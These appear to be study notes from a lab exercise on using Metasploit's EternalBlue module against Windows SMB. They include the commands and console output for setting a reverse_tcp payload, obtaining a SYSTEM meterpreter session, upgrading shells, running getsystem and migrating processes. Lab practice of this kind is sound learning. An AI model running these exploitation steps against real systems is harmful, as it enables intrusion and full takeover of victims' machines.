# Metasploit

## Notes

use exploit/windows/smb/ms17_010_eternalblue

show options

info exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/shell/reverse_tcp

setg command allows you to set the value so it can be used by default across different modules. You can clear any value set with setg using unsetg

exploit = run


```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.170.11     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.76.111      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

You can use the background command to background the session prompt and go back to the msfconsole prompt.
The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
To interact with any session, you can use the sessions -i command followed by the desired session number.
show payloads

meterpreter> execute -f cmd.exe -i -H


### Convert to meterpreter

 search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

### Show sessions
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

sessions 

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.76.111:4444 -> 10.10.170.11:49182 (10.10.170.11)



sessions -i (1) - to go to the shell
sessions -k (1) - to kill shell

  ### Migrate
 Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. 
'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. 

